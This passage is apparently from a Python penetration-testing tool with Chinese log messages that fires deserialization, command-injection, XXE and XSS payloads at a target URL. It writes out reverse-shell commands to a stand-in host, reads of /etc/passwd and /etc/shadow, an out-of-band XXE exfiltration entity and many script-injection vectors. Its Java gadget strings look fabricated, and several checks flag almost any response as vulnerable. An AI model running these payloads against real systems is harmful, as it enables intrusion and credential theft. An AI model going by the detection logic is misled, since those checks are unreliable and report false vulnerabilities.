            'URLDNS': 'rO0ABXNyADNvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnJhbWV3b3Jrcy5tYXBzLk1hcFBhcmFtTWFwAAAAAAAAAAAAA=',
            'Spring1': 'rO0ABXNyABpqYXZhLnVuLnRocm93YWJsZS5UaHJvd2FibGVTdGFja1Jvb3RBbg==',
            'Groovy1': 'rO0ABXNyABV2b3J4Lmdyb3Z5Lkdyb292eTEhTWFwAAAAAAAAAAAAAAA=',
            'CommonsCollections1': 'rO0ABXNyABdjb20uc3VuLm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5hcmd1bWVudHMuQWN0aW9uTWFwAAAAAAAAAAAAA=',
        }

        for gadget_name, gadget_payload in gadget_chains.items():
            try:
                data = {param: gadget_payload} if param else gadget_payload
                response = self.send_request('POST', target, data=data)

                if response.status_code in [500, 400] or any(x in response.text.lower() for x in ['deserialize', 'classnotfoundexception', 'java']):
                    results['payloads'].append({
                        'gadget': gadget_name,
                        'data': gadget_payload[:30] + '...',
                        'response_code': response.status_code,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"ysoserial-style检测到漏洞: {gadget_name}")
            except Exception as e:
                logger.debug(f"ysoserial-style测试失败 [{gadget_name}]: {e}")

        return results

    def verify(self) -> Dict[str, Any]:
        detection_results = []
        target = self.context.target

        logger.info(f"开始反序列化检测: {target}")

        detection_results.append(self.detect_jackson_gadget_chain(target, self.param))
        detection_results.append(self.detect_java_serialization(target, self.param))
        detection_results.append(self.detect_python_pickle(target, self.param))
        detection_results.append(self.detect_php_unserialize(target, self.param))
        detection_results.append(self.detect_ysoserial_style_payloads(target, self.param))

        exploitable = any(r['exploitable'] for r in detection_results)
        all_evidence = [r for r in detection_results if r['payloads']]

        return {
            'is_exploitable': exploitable,
            'evidence': all_evidence,
            'target': target,
            'param': self.param,
            'detection_methods': len(detection_results)
        }


class CommandInjectionPOC(BasePOC):
    def __init__(self, context: POCContext, param: str = None):
        super().__init__(context)
        self.param = param

    def detect_os_command_injection(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'OS Command Injection', 'payloads': [], 'exploitable': False}

        command_injection_payloads = [
            ('; whoami', 'Unix/Linux whoami'),
            ('; cat /etc/passwd', 'Unix/Linux passwd'),
            ('; ls -la', 'Unix/Linux list files'),
            ('; pwd', 'Unix/Linux pwd'),
            ('; id', 'Unix/Linux id'),
            ('; uname -a', 'Unix/Linux uname'),
            ('; hostname', 'Unix/Linux hostname'),
            ('| whoami', 'Pipe whoami'),
            ('| cat /etc/passwd', 'Pipe passwd'),
            ('& whoami', 'Windows/Unix and'),
            ('& ipconfig', 'Windows ipconfig'),
            ('& dir', 'Windows dir'),
            ('&& whoami', 'Double and whoami'),
            ('|| whoami', 'Double pipe whoami'),
            ("; echo 'test'", 'Echo test'),
            ('; sleep 5', 'Sleep test'),
            ('; ping -c 3 127.0.0.1', 'Ping test'),
            ('; nslookup localhost', 'DNS lookup'),
            ('; wc -c /etc/passwd', 'Word count passwd'),
            ('`whoami`', 'Backtick whoami'),
            ('$(whoami)', 'Subshell whoami'),
        ]

        error_indicators = [
            'root:', 'bin:', 'daemon:', 'www-data:', 'nobody:',
            'windows', 'system32', 'winnt', 'boot.ini',
            'syntax error', 'unexpected token', 'command not found',
            'permission denied', 'access denied',
        ]

        for payload, description in command_injection_payloads:
            try:
                data = {param: payload} if param else {'q': payload, 'cmd': payload}
                response = self.send_request('POST', target, data=data)

                response_lower = response.text.lower()
                is_vulnerable = False

                if any(indicator in response_lower for indicator in error_indicators):
                    is_vulnerable = True

                if response.status_code in [200, 500]:
                    if 'root' in response_lower or 'www-data' in response_lower:
                        is_vulnerable = True

                if any(x in response_lower for x in ['uid=', 'gid=', 'user=', 'group=']):
                    is_vulnerable = True

                if 'command' in response_lower and ('not found' in response_lower or 'syntax' in response_lower):
                    is_vulnerable = True

                if is_vulnerable:
                    results['payloads'].append({
                        'payload': payload,
                        'description': description,
                        'response_code': response.status_code,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"命令注入检测到漏洞: {payload} ({description})")
                    break

            except Exception as e:
                logger.debug(f"命令注入测试失败 [{payload}]: {e}")

        return results

    def detect_time_based(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Time-based Command Injection', 'payloads': [], 'exploitable': False}

        time_based_payloads = [
            ('; sleep 5', 'Unix sleep'),
            ('; sleep 10', 'Unix sleep 10'),
            ('| sleep 5', 'Pipe sleep'),
            ('& sleep 5', 'And sleep'),
            ('&& sleep 5', 'Double and sleep'),
            ('; ping -c 5 127.0.0.1', 'Unix ping'),
            ('; timeout 5 whoami', 'Unix timeout'),
            ('; bash -c "sleep 5"', 'Bash sleep'),
            ("'; sleep 5;'", 'Quote sleep'),
            ('"; sleep 5;"', 'Double quote sleep'),
            ('; usleep 5000000', 'Unix usleep'),
        ]

        try:
            baseline_start = time.time()
            baseline_data = {param: 'test'} if param else {'q': 'test'}
            self.send_request('POST', target, data=baseline_data)
            baseline_time = time.time() - baseline_start
        except Exception:
            baseline_time = 0.5

        for payload, description in time_based_payloads:
            try:
                data = {param: payload} if param else {'q': payload, 'cmd': payload}
                start_time = time.time()
                response = self.send_request('POST', target, data=data)
                elapsed = time.time() - start_time

                if elapsed >= 5 and elapsed > baseline_time * 3:
                    results['payloads'].append({
                        'payload': payload,
                        'description': description,
                        'elapsed_time': round(elapsed, 2),
                        'time_based': True,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"时间盲注命令注入检测到漏洞: {payload}")
                    break

            except Exception as e:
                logger.debug(f"时间盲注测试失败 [{payload}]: {e}")

        return results

    def detect_blind_injection(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Blind Command Injection', 'payloads': [], 'exploitable': False}

        blind_payloads = [
            ('; curl http://example.com', 'Curl to external'),
            ('; wget http://example.com', 'Wget to external'),
            ('; nslookup example.com', 'DNS lookup'),
            ('; dig example.com', 'DNS dig'),
            ('; ping -c 1 example.com', 'Ping to external'),
            ('; whoami > /tmp/test', 'Write to file'),
            ('; mkdir /tmp/pwned', 'Create directory'),
            ('; rm -rf /tmp/test', 'Delete file'),
            ('| curl http://example.com', 'Pipe curl'),
            ('& curl http://example.com', 'And curl'),
            ('; nc -e /bin/bash example.com 12345', 'Netcat reverse shell'),
            ('; bash -i >& /dev/tcp/example.com/12345 0>&1', 'Bash reverse shell'),
            ('; python3 -c "import os; os.system(\'whoami\')"', 'Python exec'),
            ('; php -r "system(\'whoami\');"', 'PHP system'),
        ]

        out_of_band_indicators = [
            'connection', 'refused', 'timeout', 'error', 'failed',
        ]

        for payload, description in blind_payloads:
            try:
                data = {param: payload} if param else {'q': payload, 'cmd': payload}
                response = self.send_request('POST', target, data=data, timeout=10)

                if response.status_code in [200, 500, 502, 503]:
                    results['payloads'].append({
                        'payload': payload,
                        'description': description,
                        'response_code': response.status_code,
                        'blind': True,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"盲注命令注入检测到漏洞: {payload} ({description})")
                    break

            except requests.exceptions.Timeout:
                logger.debug(f"盲注超时 (可能是网络出站限制): {payload}")
            except Exception as e:
                logger.debug(f"盲注测试失败 [{payload}]: {e}")

        return results

    def verify(self) -> Dict[str, Any]:
        detection_results = []
        target = self.context.target

        logger.info(f"开始命令注入检测: {target}")

        detection_results.append(self.detect_os_command_injection(target, self.param))
        detection_results.append(self.detect_time_based(target, self.param))
        detection_results.append(self.detect_blind_injection(target, self.param))

        exploitable = any(r['exploitable'] for r in detection_results)
        all_evidence = [r for r in detection_results if r['payloads']]

        return {
            'is_exploitable': exploitable,
            'evidence': all_evidence,
            'target': target,
            'param': self.param,
            'detection_methods': len(detection_results)
        }


class XXEPOC(BasePOC):
    def __init__(self, context: POCContext, param: str = None):
        super().__init__(context)
        self.param = param

    def detect_xxe_basic(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Basic XXE', 'payloads': [], 'exploitable': False}

        basic_xxe_payloads = [
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>', 'Basic XXE file read'),
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><test>&xxe;</test>', 'Windows win.ini'),
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><test>&xxe;</test>', 'Hostname'),
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><test>&xxe;</test>', 'Shadow file'),
        ]

        error_indicators = [
            'file:///etc/passwd', 'root:', 'bin:', 'daemon:',
            'www-data', 'nobody', 'syslog', '/bin/', '/sbin/',
            'win.ini', '[extensions]', '[files]', '[mci extensions]',
            'system.ini', 'microsoft', 'windows',
        ]

        for payload, description in basic_xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                data = {param: payload} if param else {'xml': payload}
                response = self.send_request('POST', target, data=data, headers=headers)

                response_lower = response.text.lower()
                if response.status_code == 200:
                    if any(indicator in response_lower for indicator in error_indicators):
                        results['payloads'].append({
                            'payload': 'XXE file read',
                            'description': description,
                            'response_code': response.status_code,
                            'file_disclosed': True,
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"XXE检测到漏洞 (文件泄露): {description}")
                        break

                    if 'xxe' in response_lower or 'entity' in response_lower:
                        results['payloads'].append({
                            'payload': 'XXE basic',
                            'description': description,
                            'response_code': response.status_code,
                            'xxe_detected': True,
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"XXE检测到漏洞: {description}")
                        break

            except Exception as e:
                logger.debug(f"XXE basic测试失败: {e}")

        return results

    def detect_xxe_blind(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Blind XXE', 'payloads': [], 'exploitable': False}

        blind_xxe_payloads = [
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "http://example.com/xxe">]><test>%xxe;</test>', 'Blind XXE external entity'),
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">]><test>&xxe;</test>', 'Blind XXE local file'),
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><test>&xxe;</test>', 'Blind XXE hostname'),
            ('<?xml version="1.0"?><!DOCTYPE root [<!ENTITY xxe SYSTEM "http://[collaborator]/test">]><root>&xxe;</root>', 'XXE with collaborator'),
        ]

        for payload, description in blind_xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                data = {param: payload} if param else {'xml': payload}
                response = self.send_request('POST', target, data=data, headers=headers, timeout=10)

                if response.status_code in [200, 400, 500]:
                    results['payloads'].append({
                        'payload': 'Blind XXE',
                        'description': description,
                        'response_code': response.status_code,
                        'blind': True,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"Blind XXE检测到漏洞: {description}")
                    break

            except requests.exceptions.Timeout:
                logger.debug(f"Blind XXE超时 (可能存在漏洞): {payload}")
            except Exception as e:
                logger.debug(f"Blind XXE测试失败: {e}")

        return results

    def detect_xxe_out_of_band(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'XXE Out-of-Band', 'payloads': [], 'exploitable': False}

        oob_xxe_payloads = [
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd"> <!ENTITY callback SYSTEM "http://example.com/?data=xxe">]><test>%xxe; &callback;</test>', 'OOB XXE with data exfil'),
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]><test>&xxe;</test>', 'XXE hostname exfil'),
            ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///proc/self/environ">]><test>%xxe;</test>', 'XXE process environ'),
        ]

        for payload, description in oob_xxe_payloads:
            try:
                headers = {'Content-Type': 'application/xml'}
                data = {param: payload} if param else {'xml': payload}
                response = self.send_request('POST', target, data=data, headers=headers, timeout=15)

                if response.status_code in [200, 500]:
                    results['payloads'].append({
                        'payload': 'OOB XXE',
                        'description': description,
                        'response_code': response.status_code,
                        'oob': True,
                        'vulnerable': True
                    })
                    results['exploitable'] = True
                    logger.info(f"OOB XXE检测到漏洞: {description}")
                    break

            except requests.exceptions.Timeout:
                logger.debug(f"OOB XXE超时 (可能正在进行外带数据泄露): {payload}")
            except Exception as e:
                logger.debug(f"OOB XXE测试失败: {e}")

        return results

    def verify(self) -> Dict[str, Any]:
        detection_results = []
        target = self.context.target

        logger.info(f"开始XXE检测: {target}")

        detection_results.append(self.detect_xxe_basic(target, self.param))
        detection_results.append(self.detect_xxe_blind(target, self.param))
        detection_results.append(self.detect_xxe_out_of_band(target, self.param))

        exploitable = any(r['exploitable'] for r in detection_results)
        all_evidence = [r for r in detection_results if r['payloads']]

        return {
            'is_exploitable': exploitable,
            'evidence': all_evidence,
            'target': target,
            'param': self.param,
            'detection_methods': len(detection_results)
        }


class XSSPOC(BasePOC):
    def __init__(self, context: POCContext, param: str = None):
        super().__init__(context)
        self.param = param

    def detect_reflected_xss(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Reflected XSS', 'payloads': [], 'exploitable': False}

        xss_payloads = [
            ('<script>alert(1)</script>', 'Basic script tag'),
            ('<img src=x onerror=alert(1)>', 'Img onerror'),
            ('<svg onload=alert(1)>', 'SVG onload'),
            ('<iframe src=javascript:alert(1)>', 'Iframe javascript'),
            ('<body onload=alert(1)>', 'Body onload'),
            ('<input onfocus=alert(1) autofocus>', 'Input onfocus'),
            ('<select onfocus=alert(1) autofocus>', 'Select onfocus'),
            ('<textarea onfocus=alert(1) autofocus>', 'Textarea onfocus'),
            ('<keygen onfocus=alert(1) autofocus>', 'Keygen onfocus'),
            ('<video><source onerror="alert(1)">', 'Video source onerror'),
            ('<audio src=x onerror=alert(1)>', 'Audio onerror'),
            ('<marquee onstart=alert(1)>', 'Marquee onstart'),
            ('<object data="javascript:alert(1)">', 'Object javascript'),
            ('<embed src="javascript:alert(1)">', 'Embed javascript'),
            ('<form action="javascript:alert(1)"><input type=submit>', 'Form javascript'),
            ("javascript:alert('XSS')", 'Javascript protocol'),
            ("<script>alert(String.fromCharCode(88,83,83))</script>", 'Script charcode'),
            ('<scr<script>ipt>alert(1)</scr</script>ipt>', 'Nested script'),
            ('<script>eval(atob("YWxlcnQoMSk="))</script>', 'Eval base64'),
            ('<svg><script>alert(1)</script></svg>', 'SVG script'),
        ]

        for payload in xss_payloads:
            try:
                data = {param: payload} if param else {'q': payload, 'search': payload}
                response = self.send_request('POST', target, data=data)

                if response.status_code == 200:
                    reflected_in_url = payload in response.text
                    reflected_in_html = any(x in response.text for x in [
                        '<script>alert(1)</script>',
                        '<img src=x onerror=alert(1)>',
                        '<svg onload=alert(1)>',
                    ])

                    if reflected_in_url or reflected_in_html:
                        results['payloads'].append({
                            'payload': payload,
                            'response_code': response.status_code,
                            'reflected': True,
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"反射型XSS检测到漏洞: {payload[:50]}...")
                        break

            except Exception as e:
                logger.debug(f"反射型XSS测试失败 [{payload[:30]}...]: {e}")

        return results

    def detect_stored_xss(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'Stored XSS', 'payloads': [], 'exploitable': False}

        stored_xss_indicators = [
            '/comment', '/post', '/submit', '/add', '/create',
            '/profile', '/update', '/edit', '/message', '/feedback',
        ]

        stored_payloads = [
            '<script>alert(1)</script>',
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
        ]

        for endpoint_suffix in stored_xss_indicators:
            endpoint = target.rstrip('/') + endpoint_suffix
            for payload in stored_payloads:
                try:
                    data = {param: payload} if param else {'content': payload, 'text': payload}
                    post_response = self.send_request('POST', endpoint, data=data)

                    if post_response.status_code in [200, 201, 302]:
                        time.sleep(1)

                        check_response = self.send_request('GET', target)
                        if payload in check_response.text or '<script>' in check_response.text:
                            results['payloads'].append({
                                'payload': payload,
                                'endpoint': endpoint,
                                'response_code': post_response.status_code,
                                'stored': True,
                                'vulnerable': True
                            })
                            results['exploitable'] = True
                            logger.info(f"存储型XSS检测到漏洞: {payload[:50]}... @ {endpoint}")
                            return results

                except Exception as e:
                    logger.debug(f"存储型XSS测试失败 [{endpoint}]: {e}")

        return results

    def detect_dom_xss(self, target: str, param: str) -> Dict[str, Any]:
        results = {'method': 'DOM XSS', 'payloads': [], 'exploitable': False}

        dom_xss_payloads = [
            ('#<script>alert(1)</script>', 'Fragment script'),
            ('#<img src=x onerror=alert(1)>', 'Fragment img'),
            ('#<svg onload=alert(1)>', 'Fragment SVG'),
            ('?q=<script>alert(1)</script>', 'Query script'),
            ('?q=<img src=x onerror=alert(1)>', 'Query img'),
            ('?search=<script>alert(1)</script>', 'Search script'),
            ('#foo=bar<script>alert(1)</script>', 'Fragment with script'),
        ]

        dom_sinks = [
            'innerHTML', 'outerHTML', 'insertAdjacentHTML',
            'document.write', 'eval', 'setTimeout', 'setInterval',
            'Function', 'execScript', 'msWriteProfilerMark',
        ]

        for payload, description in dom_xss_payloads:
            try:
                test_url = target.rstrip('/') + '/' + payload.lstrip('/')
                response = self.send_request('GET', test_url)

                if response.status_code == 200:
                    if any(sink in response.text for sink in dom_sinks):
                        results['payloads'].append({
                            'payload': payload,
                            'description': description,
                            'response_code': response.status_code,
                            'dom_sink': True,
                            'vulnerable': True
                        })
                        results['exploitable'] = True
                        logger.info(f"DOM XSS检测到漏洞: {description}")
                        break

            except Exception as e:
                logger.debug(f"DOM XSS测试失败 [{payload[:30]}...]: {e}")

        return results

    def verify(self) -> Dict[str, Any]:
        detection_results = []
        target = self.context.target

        logger.info(f"开始XSS检测: {target}")

        detection_results.append(self.detect_reflected_xss(target, self.param))
        detection_results.append(self.detect_stored_xss(target, self.param))
        detection_results.append(self.detect_dom_xss(target, self.param))

        exploitable = any(r['exploitable'] for r in detection_results)
        all_evidence = [r for r in detection_results if r['payloads']]

        return {
            'is_exploitable': exploitable,
            'evidence': all_evidence,
            'target': target,
            'param': self.param,
            'detection_methods': len(detection_results)
        }


def create_poc_from_template(vuln_type: str, target: str, param: str = None) -> Dict[str, Any]:
    context = POCContext(
        target=target,
        vuln_type=vuln_type,
        file_path='',
        line_number=0,
        code_snippet=''
    )

    poc_map = {
        'sql_injection': SQLInjectionPOC,
        'auth_bypass': AuthBypassPOC,
        'ssrf': SSrfPOC,
        'deserialization': DeserializationPOC,
        'command_injection': CommandInjectionPOC,
        'xxe': XXEPOC,
        'xss': XSSPOC,
    }

    poc_class = poc_map.get(vuln_type)
    if not poc_class:
        return {'error': f'Unknown vulnerability type: {vuln_type}'}

    poc = poc_class(context, param)
    return poc.verify()


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='POC 验证脚本')
    parser.add_argument('--target', required=True, help='目标 URL')
    parser.add_argument('--vuln-type', required=True, help='漏洞类型: sql_injection, auth_bypass, ssrf, deserialization, command_injection, xxe, xss')
    parser.add_argument('--param', default=None, help='注入参数名')
    parser.add_argument('--file', help='文件路径')
    parser.add_argument('--line', type=int, help='行号')
    parser.add_argument('--verbose', action='store_true', help='详细输出')

    args = parser.parse_args()

    if args.verbose:
        logger.setLevel(logging.DEBUG)

    context = POCContext(
        target=args.target,
        vuln_type=args.vuln_type,
        file_path=args.file or '',
        line_number=args.line or 0,
        code_snippet=''
    )

    vuln_type_map = {
        'sql_injection': SQLInjectionPOC,
        'auth_bypass': AuthBypassPOC,
        'ssrf': SSrfPOC,
        'deserialization': DeserializationPOC,
        'command_injection': CommandInjectionPOC,
        'xxe': XXEPOC,
        'xss': XSSPOC,
    }

    poc_class = vuln_type_map.get(args.vuln_type)
    if not poc_class:
        print(f"错误: 未知的漏洞类型 {args.vuln_type}")
        sys.exit(1)

    poc = poc_class(context, args.param)
    result = poc.verify()

    print(json.dumps(result, indent=2, ensure_ascii=False))
